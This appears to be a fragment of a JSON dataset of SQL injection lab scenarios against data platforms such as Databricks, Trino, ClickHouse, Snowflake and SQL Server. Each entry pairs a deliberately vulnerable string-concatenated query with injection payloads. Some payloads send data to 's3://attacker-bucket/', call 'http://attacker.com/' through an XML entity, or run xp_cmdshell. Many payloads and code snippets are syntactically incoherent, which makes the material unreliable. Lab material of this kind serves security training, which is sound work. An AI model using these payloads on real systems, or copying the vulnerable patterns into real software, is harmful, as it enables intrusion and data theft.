                              "Lab scenario": "SQL Injection in Databricks Notebook Widget Default Values",
                              "Lab Description": "A Databricks notebook uses widgets with dynamic default values that flow into SQL queries. The widget values are concatenated directly into query text without parameterization.",
                              "Difficulty Level": "Medium",
                              "Solution Steps": [
                                "Identify notebook widgets",
                                "Inject through default value parameters",
                                "Bypass widget type validation",
                                "Execute commands in Spark context",
                                "Access metastore tables"
                              ],
                              "Vulnerability name": "Databricks Widget Default Injection",
                              "srcCode": "dbutils.widgets.text(\"input\", '\" + defaultValue + \"'); spark.sql(\"SELECT * FROM table WHERE col = '\" + dbutils.widgets.get(\"input\") + \"'\")",
                              "payloads": [
                                "' UNION SELECT * FROM hive_metastore.default.secrets--",
                                "test' FROM (SELECT explode(array(1,2,3)))--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in Trino Catalog Property Values",
                              "Lab Description": "A Trino cluster configuration tool sets catalog properties with dynamic values. The property values are concatenated directly into catalog configuration files, allowing injection during catalog initialization.",
                              "Difficulty Level": "High",
                              "Solution Steps": [
                                "Identify catalog property settings",
                                "Inject through property values",
                                "Trigger catalog reload",
                                "Bypass property validation",
                                "Access unauthorized data sources"
                              ],
                              "Vulnerability name": "Trino Catalog Property Injection",
                              "srcCode": "CREATE CATALOG my_catalog WITH (property_name = '\" + userValue + \"')",
                              "payloads": [
                                "legit_value') FROM (SELECT * FROM system.metadata.catalogs)--",
                                "true'); INSERT INTO system.runtime.queries VALUES ('malicious')--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in Presto Session Property Values",
                              "Lab Description": "A Presto client application sets session properties with dynamic values. The property values are concatenated directly into session initialization queries.",
                              "Difficulty Level": "Medium",
                              "Solution Steps": [
                                "Identify session property endpoints",
                                "Inject through property values",
                                "Bypass property validation",
                                "Modify query execution behavior",
                                "Access system tables"
                              ],
                              "Vulnerability name": "Presto Session Property Injection",
                              "srcCode": "SET SESSION optimize_hash_generation = '\" + userValue + \"'",
                              "payloads": [
                                "true' FROM (SELECT * FROM system.metadata.tables)--",
                                "false'); SELECT * FROM system.runtime.nodes--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in ClickHouse External Dictionary Queries",
                              "Lab Description": "A ClickHouse cluster configures external dictionaries with dynamic source queries. The query text is concatenated directly into dictionary definitions, allowing injection during dictionary loading.",
                              "Difficulty Level": "High",
                              "Solution Steps": [
                                "Identify external dictionary definitions",
                                "Inject through source query parameter",
                                "Trigger dictionary reload",
                                "Bypass query validation",
                                "Access system dictionaries"
                              ],
                              "Vulnerability name": "ClickHouse Dictionary Query Injection",
                              "srcCode": "CREATE DICTIONARY my_dict (SOURCE(CLICKHOUSE(QUERY '\" + userQuery + \"')))",
                              "payloads": [
                                "SELECT 1') FROM system.dictionaries--",
                                "SELECT * FROM source_table')) UNION SELECT * FROM system.processes--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in Druid SQL Query Context Parameters",
                              "Lab Description": "A Druid cluster processes SQL queries with dynamic context parameters. The parameter values are concatenated directly into native query conversion, allowing injection during query planning.",
                              "Difficulty Level": "Medium",
                              "Solution Steps": [
                                "Identify query context parameters",
                                "Inject through context values",
                                "Bypass SQL parser validation",
                                "Execute native Druid queries",
                                "Access system tables"
                              ],
                              "Vulnerability name": "Druid Context Parameter Injection",
                              "srcCode": "{\"query\":\"SELECT * FROM datasource\",\"context\":{\"\" + paramName + \"\":\"\" + paramValue + \"\"}}",
                              "payloads": [
                                "\"sqlTimeZone\":\"UTC' FROM (SELECT * FROM sys.segments) x--\"",
                                "\"maxScatterGatherBytes\":\"1000000\"},{\"malicious\":\"' UNION SELECT * FROM sys.servers--\""
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in Hive Metastore Table Property Values",
                              "Lab Description": "A Hive metastore service accepts dynamic table properties during table creation. The property values are concatenated directly into metastore queries, allowing injection during DDL operations.",
                              "Difficulty Level": "High",
                              "Solution Steps": [
                                "Identify table property settings",
                                "Inject through property values",
                                "Trigger metastore queries",
                                "Bypass property validation",
                                "Access unauthorized metadata"
                              ],
                              "Vulnerability name": "Hive Metastore Property Injection",
                              "srcCode": "CREATE TABLE my_table (id INT) TBLPROPERTIES ('\" + propName + \"'='\" + propValue + \"')",
                              "payloads": [
                                "comment') FROM (SELECT * FROM TBLS) x--",
                                "key'='value'); SELECT * FROM PARTITIONS--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in Impala Query Option Settings",
                              "Lab Description": "An Impala client application sets query options with dynamic values. The option values are concatenated directly into query preparation, allowing injection during execution planning.",
                              "Difficulty Level": "Medium",
                              "Solution Steps": [
                                "Identify query option settings",
                                "Inject through option values",
                                "Bypass option validation",
                                "Modify execution behavior",
                                "Access system tables"
                              ],
                              "Vulnerability name": "Impala Query Option Injection",
                              "srcCode": "SET query_option='\" + userValue + \"'",
                              "payloads": [
                                "legit_value' FROM (SELECT * FROM functional.alltypes) x--",
                                "true'); EXPLAIN SELECT * FROM sys.tables--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in CockroachDB Zone Configuration Values",
                              "Lab Description": "A CockroachDB cluster management tool sets zone configurations with dynamic values. The configuration values are concatenated directly into ALTER statements, allowing injection during replication changes.",
                              "Difficulty Level": "High",
                              "Solution Steps": [
                                "Identify zone configuration changes",
                                "Inject through configuration values",
                                "Trigger configuration propagation",
                                "Bypass validation checks",
                                "Access system ranges"
                              ],
                              "Vulnerability name": "CockroachDB Zone Config Injection",
                              "srcCode": "ALTER PARTITION default OF INDEX my_table@primary CONFIGURE ZONE USING '\" + userConfig + \"'",
                              "payloads": [
                                "range_max_bytes = 134217728') FROM (SELECT * FROM crdb_internal.ranges)--",
                                "constraints = '[+region=us-east1]'); SELECT * FROM [SHOW ALL ZONE CONFIGURATIONS]--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in DuckDB HTTPFS Extension Headers",
                              "Lab Description": "A DuckDB query uses HTTPFS with dynamic request headers. The header values are concatenated directly into HTTP requests, allowing injection during remote file operations.",
                              "Difficulty Level": "Medium",
                              "Solution Steps": [
                                "Identify HTTPFS usage",
                                "Inject through header parameters",
                                "Bypass header validation",
                                "Modify remote requests",
                                "Exfiltrate credentials"
                              ],
                              "Vulnerability name": "DuckDB HTTP Header Injection",
                              "srcCode": "SET s3_access_key_id='\" + userKey + \"'; SET s3_secret_access_key='\" + userSecret + \"'",
                              "payloads": [
                                "AKIA123...' FROM (SELECT * FROM duckdb_settings)--",
                                "legit_key', s3_secret_access_key='secret')) COPY (SELECT * FROM sensitive_data) TO 's3://attacker-bucket/'--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in Materialized View Refresh Priority",
                              "Lab Description": "A data warehouse sets materialized view refresh priorities with dynamic values. The priority values are concatenated directly into refresh scheduling queries.",
                              "Difficulty Level": "High",
                              "Solution Steps": [
                                "Identify refresh priority settings",
                                "Inject through priority parameter",
                                "Trigger high-priority refresh",
                                "Bypass dependency checks",
                                "Execute commands during refresh"
                              ],
                              "Vulnerability name": "Materialized View Priority Injection",
                              "srcCode": "ALTER MATERIALIZED VIEW user_stats SET REFRESH PRIORITY \" + userPriority + \"",
                              "payloads": [
                                "100 FROM (SELECT * FROM admin_users) x--",
                                "50); COPY (SELECT * FROM secrets) TO '/tmp/leak'--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in SQL Server PolyBase External Table Options",
                              "Lab Description": "A SQL Server instance creates PolyBase external tables with dynamic options. The option values are concatenated directly into table creation, allowing injection during external data access.",
                              "Difficulty Level": "High",
                              "Solution Steps": [
                                "Identify external table creation",
                                "Inject through option parameters",
                                "Bypass PolyBase validation",
                                "Execute commands on linked servers",
                                "Exfiltrate via external tables"
                              ],
                              "Vulnerability name": "PolyBase Option Injection",
                              "srcCode": "CREATE EXTERNAL TABLE ext_data (id INT) WITH (LOCATION = '/path', \" + userOptions + \")",
                              "payloads": [
                                "DATA_SOURCE = external_source) FROM (SELECT * FROM sys.sql_logins)--",
                                "FORMAT_OPTIONS = 'FIELD_TERMINATOR=,')) EXEC xp_cmdshell('whoami')--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in Google BigQuery Remote Function Responses",
                              "Lab Description": "A BigQuery implementation calls remote functions where the HTTP response is interpolated directly into SQL. Malicious function responses can inject SQL that bypasses BigQuery's normal parameterization.",
                              "Difficulty Level": "Critical",
                              "Solution Steps": [
                                "Identify remote function calls",
                                "Craft malicious HTTP responses",
                                "Bypass response validation",
                                "Execute arbitrary SQL",
                                "Access cross-project datasets"
                              ],
                              "Vulnerability name": "BigQuery Remote Response Injection",
                              "srcCode": "CREATE FUNCTION remote_process(arg STRING) RETURNS STRING REMOTE WITH CONNECTION remote_conn OPTIONS (endpoint = 'https://api.example.com/process?param=' || arg)",
                              "payloads": [
                                "1' UNION SELECT dataset_id FROM region-us.INFORMATION_SCHEMA.SCHEMATA--",
                                "legit' FROM (SELECT * FROM EXTERNAL_QUERY('connection', 'SELECT 1'))--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in Snowflake External Stage COPY Options",
                              "Lab Description": "A Snowflake pipeline uses COPY INTO commands with dynamic stage options. The options are concatenated directly into load/unload operations, allowing injection during file operations.",
                              "Difficulty Level": "High",
                              "Solution Steps": [
                                "Identify COPY INTO commands",
                                "Inject through format options",
                                "Bypass stage validation",
                                "Modify loaded data",
                                "Exfiltrate via file operations"
                              ],
                              "Vulnerability name": "Snowflake COPY Option Injection",
                              "srcCode": "COPY INTO table FROM @stage FILE_FORMAT = (TYPE = CSV \" + userOptions + \")",
                              "payloads": [
                                "FIELD_DELIMITER=',') FROM (SELECT * FROM information_schema.tables) x--",
                                "SKIP_HEADER=1) RETURNING *--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in Databricks Unity Catalog Table Comments",
                              "Lab Description": "A Databricks environment sets table comments with dynamic values. The comment text is concatenated directly into catalog metadata queries, allowing injection during table operations.",
                              "Difficulty Level": "Medium",
                              "Solution Steps": [
                                "Identify table comment updates",
                                "Inject through comment text",
                                "Trigger catalog queries",
                                "Bypass comment validation",
                                "Access metastore data"
                              ],
                              "Vulnerability name": "Databricks Comment Injection",
                              "srcCode": "COMMENT ON TABLE my_table IS '\" + userComment + \"'",
                              "payloads": [
                                "' FROM (SELECT * FROM system.information_schema.tables)--",
                                "test'); SELECT * FROM hive_metastore.default.secrets--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in Trino Function Authorization Checks",
                              "Lab Description": "A Trino cluster implements function security with dynamic authorization checks. The check expressions are concatenated directly into function execution, allowing injection during privilege verification.",
                              "Difficulty Level": "High",
                              "Solution Steps": [
                                "Identify function authorization points",
                                "Inject through check expressions",
                                "Bypass privilege checks",
                                "Execute unauthorized functions",
                                "Access system functions"
                              ],
                              "Vulnerability name": "Trino Function Authorization Injection",
                              "srcCode": "CREATE FUNCTION my_func RETURNS STRING WITH (\" + userChecks + \") AS 'SELECT 1'",
                              "payloads": [
                                "security_definer = true) FROM (SELECT * FROM system.metadata.catalogs)--",
                                "owner = current_user) RETURNING *--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in Presto Resource Group Selector Conditions",
                              "Lab Description": "A Presto cluster configures resource groups with dynamic selector conditions. The conditions are concatenated directly into query routing logic, allowing injection during scheduling.",
                              "Difficulty Level": "Medium",
                              "Solution Steps": [
                                "Identify resource group configuration",
                                "Inject through selector conditions",
                                "Bypass condition validation",
                                "Modify query routing",
                                "Access privileged resources"
                              ],
                              "Vulnerability name": "Presto Resource Selector Injection",
                              "srcCode": "CREATE RESOURCE GROUP my_group WITH (soft_memory_limit='80%', \" + userSelectors + \")",
                              "payloads": [
                                "selector='user=admin' FROM (SELECT * FROM system.runtime.queries)--",
                                "query_type='SELECT') RETURNING *--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in ClickHouse Dictionary Source Credentials",
                              "Lab Description": "A ClickHouse cluster configures dictionary sources with dynamic credentials. The credential strings are concatenated directly into dictionary definitions, allowing injection during data loading.",
                              "Difficulty Level": "Critical",
                              "Solution Steps": [
                                "Identify dictionary credential settings",
                                "Inject through credential parameters",
                                "Trigger dictionary reload",
                                "Bypass credential validation",
                                "Access external systems"
                              ],
                              "Vulnerability name": "ClickHouse Credential Injection",
                              "srcCode": "CREATE DICTIONARY my_dict (SOURCE(MYSQL(USER '\" + user + \"' PASSWORD '\" + pass + \"')))",
                              "payloads": [
                                "root', PASSWORD 'hack')) FROM system.dictionaries--",
                                "legit_user', PASSWORD 'secret'))) COPY TABLE dict_data TO '/tmp/leak'--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in Druid Supervisor Spec Templates",
                              "Lab Description": "A Druid cluster creates ingestion supervisors with dynamic spec templates. The template values are concatenated directly into supervisor JSON, allowing injection during data ingestion.",
                              "Difficulty Level": "High",
                              "Solution Steps": [
                                "Identify supervisor creation",
                                "Inject through spec parameters",
                                "Bypass JSON validation",
                                "Modify ingestion behavior",
                                "Access system metadata"
                              ],
                              "Vulnerability name": "Druid Supervisor Spec Injection",
                              "srcCode": "{\"type\":\"index_parallel\",\"spec\":{\"\" + specKey + \"\":\"\" + specValue + \"\"}}",
                              "payloads": [
                                "\"ioConfig\":{\"type\":\"index_parallel\"},\"malicious\":\"' UNION SELECT * FROM sys.servers--\"",
                                "\"dataSchema\":{\"dataSource\":\"test\"}}; SELECT * FROM sys.segments--"
                              ]
                            },

                            {
                                  "Lab scenario": "SQL Injection in PostgreSQL SECURITY LABEL",
                                  "Lab Description": "A security labeling system uses PostgreSQL's SECURITY LABEL command with dynamic label values. The label text is concatenated directly into security policy enforcement, allowing injection during label assignment to database objects.",
                                  "Difficulty Level": "High",
                                  "Solution Steps": [
                                    "Identify SECURITY LABEL usage",
                                    "Inject through label value parameter",
                                    "Bypass label format validation",
                                    "Modify row-level security policies",
                                    "Escalate privileges via policy manipulation"
                                  ],
                                  "Vulnerability name": "PostgreSQL Security Label Injection",
                                  "srcCode": "SECURITY LABEL FOR 'custom_provider' ON TABLE sensitive_data IS '\\'' + userLabel + '\\''",
                                  "payloads": [
                                    "' || (SELECT current_setting('is_superuser')))--",
                                    "confidential' FROM (SELECT * FROM pg_policies) x--"
                                  ]
                                },
                                {
                                  "Lab scenario": "SQL Injection in MySQL X Plugin Document IDs",
                                  "Lab Description": "A document store using MySQL X Protocol processes CRUD operations with dynamic document _id fields. The document identifiers are concatenated directly into NoSQL-style queries that translate to SQL, allowing injection through crafted IDs.",
                                  "Difficulty Level": "Medium",
                                  "Solution Steps": [
                                    "Identify X DevAPI CRUD operations",
                                    "Inject through document _id parameter",
                                    "Bypass JSON document validation",
                                    "Execute arbitrary SQL through ID values",
                                    "Exfiltrate data via error messages"
                                  ],
                                  "Vulnerability name": "MySQL X Plugin ID Injection",
                                  "srcCode": "db.collection.find('_id = \"\\'' + userId + '\\\"')",
                                  "payloads": [
                                    "\"' OR 1=1--\"",
                                    "\"') FROM (SELECT * FROM mysql.user) x--\""
                                  ]
                                },
                                {
                                  "Lab scenario": "SQL Injection in SQL Server Graph MATCH Shortest Path",
                                  "Lab Description": "A graph analytics application uses SHORTEST_PATH with dynamic node filters. The filter expressions are concatenated directly into graph traversal queries, allowing injection during path calculation.",
                                  "Difficulty Level": "Hard",
                                  "Solution Steps": [
                                    "Identify SHORTEST_PATH usage",
                                    "Inject through node filter parameters",
                                    "Bypass graph syntax validation",
                                    "Access unauthorized graph nodes",
                                    "Exfiltrate data via path properties"
                                  ],
                                  "Vulnerability name": "SQL Server Graph Path Injection",
                                  "srcCode": "MATCH SHORTEST_PATH((n)-[*]->(m) WHERE n.name = '\\'' + userFilter + '\\'')",
                                  "payloads": [
                                    "' OR EXISTS(SELECT * FROM sys.objects)--",
                                    "admin' AND 1=CONVERT(INT,(SELECT @@version)))--"
                                  ]
                                },
                                {
                                  "Lab scenario": "SQL Injection in Oracle Text HIGHLIGHT Offset Parameters",
                                  "Lab Description": "A document search application uses CTX_DOC.HIGHLIGHT with dynamic offset parameters. The numeric offsets are concatenated directly into highlight generation, allowing injection through arithmetic expressions.",
                                  "Difficulty Level": "Medium",
                                  "Solution Steps": [
                                    "Identify CTX_DOC.HIGHLIGHT calls",
                                    "Inject through offset parameters",
                                    "Bypass numeric validation",
                                    "Access document store tables",
                                    "Manipulate highlighted output"
                                  ],
                                  "Vulnerability name": "Oracle Highlight Offset Injection",
                                  "srcCode": "CTX_DOC.HIGHLIGHT('index_name', '\\'' + docId + '\\'', '\\'' + userOffsets + '\\'')",
                                  "payloads": [
                                    "1,1) FROM (SELECT * FROM ctx_user_indexes) x--",
                                    "0+TO_NUMBER(EXTRACTVALUE(XMLTYPE('<?xml version=\"1.0\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://attacker.com/\"> %remote;]>'),'/l'))--"
                                  ]
                                },
                                {
                                  "Lab scenario": "SQL Injection in Snowflake Time Travel OFFSET",
                                  "Lab Description": "A data recovery tool uses time travel queries with dynamic OFFSET values. The time offset strings are concatenated directly into AT|BEFORE clauses, allowing injection during historical data retrieval.",
                                  "Difficulty Level": "High",
                                  "Solution Steps": [
                                    "Identify time travel queries",
                                    "Inject through offset parameters",
                                    "Bypass timestamp validation",
                                    "Access unauthorized historical versions",
                                    "Recover deleted records via offset manipulation"
                                  ],
                                  "Vulnerability name": "Snowflake Time Offset Injection",
                                  "srcCode": "SELECT * FROM table AT(OFFSET => '\\'' + userOffset + '\\''::VARIANT)",
                                  "payloads": [
                                    "'-60 MINUTE'::VARIANT) FROM (SELECT * FROM information_schema.tables)--",
                                    "INTERVAL '1 HOUR'))) RETURNING *--"
                                  ]
                            }
                              
                          
                      
                  
              
              
    
            ]